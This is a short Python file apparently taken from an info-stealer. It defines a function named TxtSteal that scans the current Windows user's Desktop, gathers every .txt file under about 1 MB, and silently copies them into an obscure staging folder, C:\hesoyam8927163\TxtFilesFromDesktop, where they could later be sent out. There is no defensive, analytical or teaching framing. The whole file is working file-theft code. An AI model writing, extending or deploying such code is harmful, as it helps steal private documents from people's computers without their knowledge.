
import os
import shutil


def TxtSteal():
    try:
        desktop = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
        listoffiles = os.listdir(desktop)
        txtfiles = []
        finnalytxtfiles = []
        for i in range(0, len(listoffiles)):
            if listoffiles[i].endswith(".txt"):
                txtfiles.append(listoffiles[i])
        for i in range(0, len(txtfiles)):
            size = os.path.getsize(desktop+"\\"+txtfiles[i])
            if size < 1000000:
                finnalytxtfiles.append(desktop+"\\"+txtfiles[i])
        for i in range(0, len(finnalytxtfiles)):
            shutil.copy(finnalytxtfiles[i], r'C:\hesoyam8927163\TxtFilesFromDesktop')
    except Exception as e:
        print(e)

